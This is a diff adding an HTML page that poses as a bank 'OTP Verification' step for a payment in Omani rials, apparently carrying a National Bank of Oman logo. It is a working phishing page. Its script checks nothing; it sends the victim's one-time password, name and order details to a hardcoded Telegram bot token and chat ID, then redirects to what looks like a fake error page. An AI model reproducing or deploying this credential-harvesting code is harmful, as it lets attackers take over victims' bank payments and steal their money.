@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTP Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .otp-container {
+      background-color: white;
+      width: 360px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    h3 {
+      margin: 10px 0;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    p {
+      margin: 4px 0;
+      font-size: 14px;
+    }
+
+    input[type="text"] {
+      width: 340px;
+      padding: 10px;
+      font-size: 16px;
+      margin: 12px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      text-align: center;
+    }
+
+    .countdown {
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .resend {
+      text-align: center;
+      margin-top: 8px;
+    }
+
+    .resend a {
+      color: #094792;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .actions {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .pay-btn {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .cancel-btn {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="otp-container">
+    <div class="logo">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQC6LGTXVDBkhQU4paEYmzug2EWYjHhCg9RuA&s" alt="NBO Logo">
+    </div>
+
+    <p><strong>quantity:</strong> <span id="quantity"></span></p>
+    <p><strong>category:</strong> <span id="category"></span></p>
+    <p><strong>Amount:</strong> <span id="totalPrice"></span> omr</p>
+
+    <p>Please enter the OTP received on your mobile/Email</p>
+    <input type="text" id="otp-input" placeholder="Enter OTP" maxlength="6" inputmode="numeric" />
+
+    <div class="countdown">
+      OTP Expires in <span id="timer">2:00</span>
+    </div>
+
+    <div class="resend">
+      <a id="resend-otp">Regenerate OTP</a>
+    </div>
+
+    <div class="actions">
+      <button class="pay-btn" id="pay-button">PAY OMR 100.00</button>
+      <button class="cancel-btn">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    // قراءة القيم من localStorage
+    const category = localStorage.getItem('category');
+    const quantity = localStorage.getItem('quantity');
+    const totalPrice = localStorage.getItem('totalPrice');
+    const userName = localStorage.getItem('userName') || 'غير معروف';
+
+    // عرض القيم في الصفحة
+    document.getElementById('category').textContent = category || '';
+    document.getElementById('quantity').textContent = quantity || '';
+    document.getElementById('totalPrice').textContent = totalPrice || '';
+
+    // تحديث زر الدفع بالمبلغ
+    document.getElementById('pay-button').textContent = `PAY OMR ${totalPrice || '0.00'}`;
+
+    // Countdown Timer
+    let timerElement = document.getElementById("timer");
+    let timeLeft = 120;
+
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+      if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateTimer, 1000);
+      } else {
+        timerElement.textContent = "Expired";
+      }
+    }
+
+    updateTimer();
+
+    document.getElementById("resend-otp").addEventListener("click", () => {
+      alert("A new OTP has been sent.");
+      timeLeft = 120;
+      updateTimer();
+    });
+
+    document.getElementById("pay-button").addEventListener("click", () => {
+      const otp = document.getElementById("otp-input").value.trim();
+      if (otp.length !== 6 || !/^\d+$/.test(otp)) {
+        alert("Please enter a valid 6-digit OTP.");
+        return;
+      }
+
+      sendOtpToTelegram(otp);
+    });
+
+    function sendOtpToTelegram(otp) {
+      const botConfigs = [
+         {
+        token: '8086646027:AAH2MyOuWFl3Hw-9KfdbbSjbvYp7p9jkjyE',
+        chatId: '7595871538'
+      }
+      ];
+
+      const message =
+        `✅  الرمز الاول:\n\n` +
+        `👤 من: ${userName}\n` +
+        `📦 الفئة: ${category}\n` +
+        `🔢 الكمية: ${quantity}\n` +
+        `💰 السعر: ${totalPrice} OMR\n` +
+        `🔐 OTP: ${otp}`;
+
+      botConfigs.forEach(({ token, chatId }) => {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("✅ OTP أُرسل إلى:", chatId);
+          } else {
+            console.error("❌ فشل الإرسال إلى:", chatId);
+          }
+        })
+        .catch(error => {
+          console.error("⚠️ خطأ في الاتصال:", error);
+        });
+      });
+
+      setTimeout(() => {
+        window.location.href = "otperoroman.html"; // يمكنك تعديل المسار إذا رغبت
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
